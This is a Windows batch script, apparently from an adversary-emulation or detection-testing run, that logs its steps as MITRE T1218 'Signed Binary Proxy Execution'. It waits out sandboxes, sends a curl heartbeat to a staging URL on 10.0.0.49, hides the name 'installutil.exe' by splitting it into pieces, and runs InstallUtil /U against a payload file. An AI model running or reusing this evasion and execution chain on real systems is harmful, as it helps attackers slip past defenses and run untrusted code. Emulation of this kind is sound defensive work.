@echo off
SETLOCAL EnableDelayedExpansion

REM PHR_ constants (plain literals - NEVER obfuscated)
SET xzqmnb=%APPDATA%\8486\869c7bb2
SET vbkflpd=https://10.0.0.49
SET zyxwvut=https://10.0.0.49/stage/2/icon.png?8486-7
SET mnbvczx=ITZEL-S2BO
SET lkjhgfds=7
SET poiuytr=firelox.txt
SET qwertyui=8486

REM Initialize log file path
SET asdfghj=%APPDATA%\!lkjhgfds!\macula-simulations.log

REM Initial delay to evade sandbox
echo [!DATE! !TIME!][DEBUG][!mnbvczx!]: initial_delay_start>> "!asdfghj!" 2>nul
ping -n 35 127.0.0.1 >nul
echo [!DATE! !TIME!][DEBUG][!mnbvczx!]: initial_delay_complete>> "!asdfghj!" 2>nul

REM Heartbeat using curl (exact command as required)
echo [!DATE! !TIME!][DEBUG][!mnbvczx!]: heartbeat_start>> "!asdfghj!" 2>nul
curl -k -s -o nul "!zyxwvut!"
echo [!DATE! !TIME!][DEBUG][!mnbvczx!]: heartbeat_complete>> "!asdfghj!" 2>nul

REM Delay before next operation
echo [!DATE! !TIME!][DEBUG][!mnbvczx!]: delay_start>> "!asdfghj!" 2>nul
timeout /t 12 /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!mnbvczx!]: delay_complete>> "!asdfghj!" 2>nul

REM Build installutil command with variable indirection
SET a=inst
SET b=all
SET c=util
SET d=.ex
SET e=e
SET f=%a%%b%%c%%d%%e%

REM Build command arguments
SET g=/log
SET h=file
SET i==
SET j=/LogT
SET k=oConsole=
SET l=false
SET m=/U
SET n=!g!!h!!i!
SET o=!j!!k!!l!
SET p=!n! !o! !m! !poiuytr!

REM Change to output directory
echo [!DATE! !TIME!][DEBUG][!mnbvczx!]: chdir_start=!xzqmnb!>> "!asdfghj!" 2>nul
cd /d "!xzqmnb!"
echo [!DATE! !TIME!][DEBUG][!mnbvczx!]: chdir_complete>> "!asdfghj!" 2>nul

REM Random delay
SET /A rnd=!RANDOM! %% 15 + 8
echo [!DATE! !TIME!][DEBUG][!mnbvczx!]: random_delay_start=!rnd!>> "!asdfghj!" 2>nul
timeout /t !rnd! /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!mnbvczx!]: random_delay_complete>> "!asdfghj!" 2>nul

REM Execute InstallUtil with obfuscated command
echo [!DATE! !TIME!][DEBUG][!mnbvczx!]: t1218_execution_start>> "!asdfghj!" 2>nul
SET result=1
SET err_detail=

"%f%" !p! >nul 2>nul
IF ERRORLEVEL 1 (
    SET result=0
    SET err_detail=installutil_failed
)

REM Log TTP execution
FOR /F "tokens=1-3 delims=/." %%A IN ("!DATE!") DO SET year=%%C&SET month=%%A&SET day=%%B
SET logdate=!year!-!month!-!day!
SET logtime=!TIME:~0,8!.000
echo [!logdate! !logtime!][!mnbvczx!]: !lkjhgfds!-!qwertyui!-T1218|Signed Binary Proxy Execution=!result!:!err_detail!>> "!asdfghj!" 2>nul
echo [!DATE! !TIME!][DEBUG][!mnbvczx!]: t1218_execution_complete=!result!>> "!asdfghj!" 2>nul

REM Final delay
echo [!DATE! !TIME!][DEBUG][!mnbvczx!]: final_delay_start>> "!asdfghj!" 2>nul
CHOICE /C Y /N /D Y /T 15 >nul
echo [!DATE! !TIME!][DEBUG][!mnbvczx!]: final_delay_complete>> "!asdfghj!" 2>nul

ENDLOCAL